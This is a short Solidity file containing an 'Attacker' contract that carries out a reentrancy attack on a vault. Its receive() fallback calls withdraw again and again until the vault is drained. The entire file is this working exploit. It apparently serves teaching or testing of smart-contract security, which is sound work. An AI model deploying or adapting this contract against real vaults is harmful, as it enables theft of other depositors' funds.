// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {

    IVault public vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "NEED_MORE_ETH");

        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
